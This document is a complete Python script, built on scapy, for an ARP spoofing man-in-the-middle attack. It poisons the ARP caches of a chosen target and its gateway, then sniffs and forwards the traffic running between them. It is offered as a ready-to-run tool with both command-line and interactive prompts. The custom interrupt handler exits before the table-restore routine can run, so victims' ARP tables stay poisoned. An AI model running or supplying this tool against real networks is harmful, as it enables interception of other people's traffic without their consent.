import argparse
import signal
import sys
import questionary
import scapy.all as scapy


class ArpSpoofing:
    def __init__(self, target_ip, spoof_ip, interface):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface
        self.running = True

        self.target_mac = self.get_mac(self.target_ip)
        self.spoof_mac = self.get_mac(self.spoof_ip)
        self.my_mac = self.get_mac(scapy.get_if_addr(self.interface))

        if not self.target_mac:
            print(f"[-] Could not resolve MAC address for {self.target_ip}")
            sys.exit(1)
        if not self.spoof_mac:
            print(f"[-] Could not resolve MAC address for {self.spoof_ip}")
            sys.exit(1)

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        answered_list = scapy.srp(
            arp_request_broadcast,
            timeout=2,
            verbose=False,
            iface=self.interface,
        )[0]

        return answered_list[0][1].hwsrc if answered_list else None

    def spoof(self, target_ip, target_mac, spoof_ip):
        """Sends a spoofed ARP reply claiming to be 'spoof_ip'."""
        packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
        )
        scapy.send(packet, verbose=False, iface=self.interface)

    def restore(self):
        """Restores the original ARP tables by sending legitimate packets."""
        print("\n[*] Restoring ARP tables...")
        packet_target = scapy.ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.spoof_ip,
            hwsrc=self.spoof_mac,
        )
        packet_spoof = scapy.ARP(
            op=2,
            pdst=self.spoof_ip,
            hwdst=self.spoof_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac,
        )
        scapy.send(packet_target, count=5, verbose=False, iface=self.interface)
        scapy.send(packet_spoof, count=5, verbose=False, iface=self.interface)

    def forward_pkt(self, pkt):
        if (
            scapy.Ether in pkt
            and scapy.IP in pkt
            and pkt[scapy.Ether].src != self.my_mac
        ):
            if pkt[scapy.IP].src == self.target_ip:
                pkt[scapy.Ether].dst = self.spoof_mac
                pkt[scapy.Ether].src = self.my_mac
                scapy.sendp(pkt, verbose=False, iface=self.interface)

            elif pkt[scapy.IP].src == self.spoof_ip:
                pkt[scapy.Ether].dst = self.target_mac
                pkt[scapy.Ether].src = self.my_mac
                scapy.sendp(pkt, verbose=False, iface=self.interface)

    def run(self):
        print(
            f"[*] Starting ARP spoofing between {self.target_ip} and {self.spoof_ip}..."
        )
        try:
            while self.running:
                self.spoof(self.target_ip, self.target_mac, self.spoof_ip)
                self.spoof(self.spoof_ip, self.spoof_mac, self.target_ip)

                scapy.sniff(
                    iface=self.interface,
                    prn=self.forward_pkt,
                    filter="ip",
                    timeout=2,
                )
        except KeyboardInterrupt:
            self.restore()


def ctrl_c(sig, frame):
    print("\n[!] Interruption detected. Exiting...")
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, ctrl_c)

    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            description="ARP Spoofing Tool to sniff network traffic."
        )
        parser.add_argument("-t", "--target", required=True, help="Target IP address.")
        parser.add_argument(
            "-s", "--spoof", required=True, help="Spoofed IP address (e.g., Gateway)."
        )
        parser.add_argument(
            "-i", "--interface", required=True, help="Network interface (e.g., eth0)."
        )

        args = parser.parse_args()
        target = args.target
        spoof = args.spoof
        inter = args.interface
    else:
        choices_all = [iface.name for iface in scapy.get_working_ifaces()]
        target = questionary.text("What's your target IP?").ask()
        spoof = questionary.text("What's your gateway/IP to spoof?").ask()
        inter = questionary.select("Select the interface:", choices=choices_all).ask()

    spoofer = ArpSpoofing(target_ip=target, spoof_ip=spoof, interface=inter)
    spoofer.run()
